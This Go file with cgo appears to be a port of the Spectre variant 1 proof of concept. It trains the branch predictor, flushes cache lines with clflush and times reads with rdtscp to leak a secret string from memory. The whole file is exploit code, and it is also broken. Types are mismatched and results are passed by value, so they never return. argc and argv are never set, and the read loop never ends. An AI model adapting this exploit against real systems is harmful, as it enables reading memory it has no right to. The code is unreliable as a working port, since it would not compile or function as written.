package main

// #include <stdio.h>
// #include <stdlib.h>
// #include <stdint.h>
// #ifdef _MSC_VER
// #include <intrin.h> /* for rdtscp and clflush */
// #pragma optimize("gt", on)
// # else
// #include <x86intrin.h> /* for rdtscp and clflush */
// #endif
import "C"
import (
	"fmt"
	"strconv"
	"unsafe"
)

/********************************************************************
Victim code.
********************************************************************/
var array1_size uint = 16
var unused1 = [64]uint8{}
var array1 = [160]uint8{ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}
var unused2 = [64]uint8{}
var array2 = [256 * 512]uint8{}

var Results = [256]int{}

var secret = []byte("The Magic Words are Squeamish Ossifrage.")

var temp uint8 = 0 /* Used so compiler won’t optimize out victim_function() */

func victim_function(x C.size_t) {
	if x < array1_size {
		temp &= array2[array1[x] * 512]
	}
}

/********************************************************************
Analysis code
********************************************************************/
const CACHE_HIT_THRESHOLD = 80 /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
func readMemoryByte(malicious_x C.size_t, value[2] uint8, score[2] int) {
	var tries, j, k, mix_i int
	var junk uint8
	var training_x, x C.size_t
	var time1, time2 uint64 //register
	var addr *uint8

	for i := 0; i < 256; i++ {
		Results[i] = 0
	}

	for tries = 999; tries > 0; tries-- {

		/* Flush array2[256*(0..255)] from cache */
		for i := 0; i < 256; i++ {
			C._mm_clflush( & array2[i * 512]) /* intrinsic for clflush instruction */
		}

	/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
	training_x = tries % int(array1_size);
	for j := 29; j >= 0; j-- {
		C._mm_clflush( & array1_size);

		for z := 0; z < 100; z++ {} /* Delay (can also mfence) */

		/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
		/* Avoid jumps in case those tip off the branch predictor */
		x = ((j % 6) - 1) & 0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		x = (x | (x >> 16)) /* Set x=-1 if j&6=0, else x=0 */
		x = training_x ^ (x & (malicious_x ^ training_x))

		/* Call the victim! */
		victim_function(x)

	}

	/* Tme reads. Order is lightly mixed up to prevent stride prediction */
	for i := 0; i < 256; i++ {
		mix_i = ((i * 167) + 13) & 255
		addr = & array2[mix_i * 512]
		time1 = C.__rdtscp(&junk) /* READ TIMER */
		junk = *addr             /* MEMORY ACCESS TO TIME */
		time2 = C.__rdtscp(&junk) - time1 /* READ TIMER & COMPUTE ELAPSED TIME */
		if time2 <= CACHE_HIT_THRESHOLD && mix_i != int(array1[tries % int(array1_size)]) {
			Results[mix_i]++ /* cache hit - add +1 to score for this value */
		}
	}

	/* Locate highest & second-highest results results tallies in j/k */
	j = 0
	k = 0
	for i := 0; i < 256; i++ {
		if j < 0 || Results[i] >= Results[j] {
			k = j
			j = i
		} else if k < 0 || Results[i] >= Results[k] {
			k = i
		}
	}
		if (Results[j] >= (2 * Results[k] + 5) || (Results[j] == 2 && Results[k] == 0)) {
			break /* Clear success if best is > 2*runner-up + 5 or 2/0) */
		}

	}
	Results[0] ^= int(junk) /* use junk so code above won’t get optimized out*/
	value[0] = uint8(j)
	score[0] = Results[j]
	value[1] = uint8(k)
	score[1] = Results[k]
}

func main() {
	var argc int
	var argv string
	malicious_x := uint8(uintptr(unsafe.Pointer(&([]byte(secret)[0]))) - uintptr(unsafe.Pointer(&array1[0])))
	for i := range array2 {
		array2[i] = 1
	}
	var score = [2]int{}
	len := 4
	var value = [2]uint8{}

	for i := 0; i < 131072; i++ {
		array2[i] = 1 /* write to array2 so in RAM not copy-on-write zero pages */
	}

	if (argc == 3) {
		C.sscanf(argv[1], "%p", malicious_x)
		malicious_x -= 160 /* Convert input value into a pointer */
		C.sscanf(argv[2], "%d", & len)
	}

	var temp string

	fmt.Printf("Reading %d bytes:\n", len)
	for len-1 >= 0 {
		fmt.Printf("Reading at malicious_x ... ")
		readMemoryByte(malicious_x+1, value, score)

		if score[0] >= 2 * score[1] {
			temp = "Success"
		} else {
			temp = "Unclear"
		}

		fmt.Printf("%s: ", temp)

		if value[0] > 31 && value[0] < 127 {
			temp =  strconv.FormatInt(int64(value[0]), 10)
		} else {
			temp = "?"
		}

		fmt.Printf("0x%02X=’%s’ score=%d ", value[0], temp, score[0])

		if score[1] > 0 {
			fmt.Printf("(second best: 0x%02X score=%d)", value[1], score[1])
		}

		fmt.Printf("\n")
	}
	return
}
